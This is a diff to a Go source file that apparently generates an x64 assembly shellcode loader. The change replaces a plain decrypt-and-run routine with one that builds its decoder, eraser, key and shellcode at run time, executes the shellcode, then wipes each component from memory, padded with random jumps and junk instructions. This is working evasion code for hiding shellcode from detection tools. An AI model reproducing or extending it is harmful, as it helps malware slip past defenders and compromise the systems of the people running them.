@@ -17,7 +17,7 @@ var x64asm = `
 .code64
 
 entry:
-  // prepare the environment
+  // save context and prepare the environment
   {{db .JumpShort}}                          // random jump short
   {{db .SaveContext}}                        // save GP registers
   push rbx                         {{igi}}   // store rbx for save entry address
@@ -28,42 +28,36 @@ entry:
   fxsave [rsp]                     {{igi}}   // save FP registers
 
   // calculate the entry address
-  {{igi}}      {{igi}}
+  {{igi}}                          {{igi}}
   call calc_entry_addr
   flag_CEA:
-  {{igi}}      {{igi}}
+  {{igi}}                          {{igi}}
 
-  // save arguments for test
-  push rcx                         {{igi}}
-  push rdx                         {{igi}}
-  push r8                          {{igi}}
-  push r9                          {{igi}}
+  lea rax, [rbx + decoder_stub + 0x02]
+  mov word ptr [rax], 0x1234
 
-  call decrypt_shellcode           {{igi}}
-  
-  // restore arguments for test
-  pop r9                           {{igi}}
-  pop r8                           {{igi}}
-  pop rdx                          {{igi}}
-  pop rcx                          {{igi}}
+  // build instructions to stub and erase itself
+  {{db .SaveRegister}}
+  call decoder_builder             {{igi}}
+  call eraser_builder              {{igi}}
+  call crypto_key_builder          {{igi}}
+  call shellcode_builder           {{igi}}
+  call decode_shellcode            {{igi}}
+  call erase_builders              {{igi}}
+  call erase_decoder_stub          {{igi}}
+  call erase_crypto_key_stub       {{igi}}
+  {{db .RestoreRegister}}
 
+  // execute the shellcode
   sub rsp, 0x80                    {{igi}}   // reserve stack
   call shellcode_stub              {{igi}}   // call the shellcode
   add rsp, 0x80                    {{igi}}   // restore stack
 
-  push rax                         {{igi}}   // save the return value
- 
-  // erase the shellcode
-  // test rax, rax
-  // jmp skip_erase
-  lea rcx, [rbx + shellcode_stub]  {{igi}}
-  mov rdx, {{hex .ShellcodeLen}}   {{igi}}
-  sub rsp, 0x20                    {{igi}}   // reserve stack
-  call eraser_stub                 {{igi}}   // call the eraser
-  add rsp, 0x20                    {{igi}}   // restore stack
-  skip_erase:
-
-  pop rax                          {{igi}}   // restore the return value
+  // erase the remaining instructions
+  push rax                         {{igi}}   // save the shellcode return value
+  call erase_shellcode_stub        {{igi}}
+  call erase_eraser_stub           {{igi}}
+  pop rax                          {{igi}}   // restore the shellcode return value
 
   fxrstor [rsp]                    {{igi}}   // restore FP registers
   add rsp, 0x200                   {{igi}}   // reserve stack
@@ -81,39 +75,93 @@ calc_entry_addr:
   push rax                         {{igi}}   // push return address
   ret                              {{igi}}   // return to the entry
 
-decrypt_shellcode:
+decode_shellcode:
   lea rcx, [rbx + shellcode_stub]  {{igi}}
   mov rdx, {{hex .ShellcodeLen}}   {{igi}}
-  lea r8, [rbx + crypto_key]       {{igi}}
+  lea r8, [rbx + crypto_key_stub]  {{igi}}
   mov r9, {{hex .CryptoKeyLen}}    {{igi}}
   sub rsp, 0x40                    {{igi}}
-  call decryptor_stub              {{igi}}
+  call decoder_stub                {{igi}}
   add rsp, 0x40                    {{igi}}
   ret                              {{igi}}
 
-decryptor_stub:
-  {{db .DecryptorStub}}            {{igi}}
+erase_builders:
+  lea rcx, [rbx + decoder_builder]           {{igi}}
+  mov rdx, decoder_stub - decoder_builder    {{igi}}
+  call eraser_stub                           {{igi}}
+  ret                                        {{igi}}
 
-crypto_key:
-  {{db .CryptoKey}}                {{igi}}
+erase_decoder_stub:
+  lea rcx, [rbx + decoder_stub]              {{igi}}
+  mov rdx, eraser_stub - decoder_stub        {{igi}}
+  call eraser_stub                           {{igi}}
+  ret                                        {{igi}}
+
+erase_crypto_key_stub:
+  lea rcx, [rbx + crypto_key_stub]           {{igi}}
+  mov rdx, shellcode_stub - crypto_key_stub  {{igi}}
+  call eraser_stub                           {{igi}}
+  ret                                        {{igi}}
+
+erase_shellcode_stub:
+  // test rax, rax
+  // jmp skip_erase
+  lea rcx, [rbx + shellcode_stub]            {{igi}}
+  mov rdx, {{hex .ShellcodeLen}}             {{igi}}
+  call eraser_stub                           {{igi}}
+  skip_erase:
+  ret                                        {{igi}}
+
+erase_eraser_stub:
+  ret                                        {{igi}}
+
+decoder_builder:
+  {{.DecoderBuilder}}
+  ret                              {{igi}}
+
+eraser_builder:
+  {{.EraserBuilder}}
+  ret                              {{igi}}
+
+crypto_key_builder:
+  {{.CryptoKeyBuilder}}
+  ret                              {{igi}}
+
+shellcode_builder:
+  {{.ShellcodeBuilder}}
+  ret                              {{igi}}
+
+decoder_stub:
+  {{db .DecoderStub}}              {{igi}}
 
 eraser_stub:
   {{db .EraserStub}}               {{igi}}
 
+crypto_key_stub:
+  {{db .CryptoKeyStub}}            {{igi}}
+
 shellcode_stub:
-  {{db .Shellcode}}
+  {{db .ShellcodeStub}}
 `
 
 type asmContext struct {
 	JumpShort      []byte
 	SaveContext    []byte
 	RestoreContext []byte
-	DecryptorStub  []byte
-	EraserStub     []byte
-	CryptoKey      []byte
-	CryptoKeyLen   int
-	Shellcode      []byte
-	ShellcodeLen   int
+
+	SaveRegister     []byte
+	RestoreRegister  []byte
+	DecoderBuilder   string
+	EraserBuilder    string
+	CryptoKeyBuilder string
+	ShellcodeBuilder string
+
+	DecoderStub   []byte
+	EraserStub    []byte
+	CryptoKeyStub []byte
+	CryptoKeyLen  int
+	ShellcodeStub []byte
+	ShellcodeLen  int
 }
 
 func toDB(b []byte) string {
